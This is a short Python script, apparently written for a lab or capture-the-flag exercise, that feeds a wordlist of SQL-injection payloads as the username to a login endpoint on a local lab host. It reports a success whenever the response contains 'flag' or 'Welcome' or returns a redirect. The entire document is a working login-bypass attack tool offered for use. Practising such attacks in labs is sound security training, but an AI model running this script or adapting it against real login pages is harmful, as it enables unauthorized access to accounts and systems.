#!/usr/bin/env python3
import requests

def load_payloads(wordlist):
    with open(wordlist, 'r') as f:
        return [line.strip() for line in f]

def attack(url, wordlist):
    payloads = load_payloads(wordlist)

    for username in payloads:
        data = {
            "username": username,
            "password": "irrelevant"
        }

        try:
            res = requests.post(url, data=data, timeout=5)

            if "flag" in res.text or "Welcome" in res.text or res.status_code == 302:
                print(f"[+] SUCCESS: {username}")
            else:
                print(f"[-] Failed: {username}")

        except Exception as e:
            print(f"[!] Error with payload '{username}': {e}")

if __name__ == "__main__":
    target_url = "http://lab.local/mini_test-Lab/login_check.php"
    payload_file = "sqli_payloads.txt"
    attack(target_url, payload_file)
